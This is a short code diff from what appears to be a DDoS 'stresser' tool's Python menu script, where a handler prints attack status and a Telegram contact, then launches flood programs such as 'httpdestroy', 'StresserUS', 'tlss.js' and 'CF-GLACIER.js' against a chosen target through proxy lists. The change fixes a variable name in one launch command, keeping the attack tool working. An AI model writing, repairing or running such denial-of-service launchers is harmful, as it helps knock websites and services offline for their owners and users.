@@ -184,7 +184,7 @@ def handle_menu_selection(selection):
         print(f"  Total Proxy: {proxy_count}")
         print(f"\n  Started attack")
         print(f"  Have question? telegram @lowtofast\n")
-        os.system(f"./httpdestroy {target} {time} {requests} {thread} {proxy_file}")
+        os.system(f"./httpdestroy {target} {time} {request} {thread} {proxy_file}")
         os.system(f"./StresserUS version=2 host={target} limit={limit} time={time} list={proxy_file} threads={thread} mode={method}")
         run_script('tlss.js', [target, time, limit, thread, proxy_file])
         run_script('CF-GLACIER.js', [method, target, proxy_file, time, request, thread])
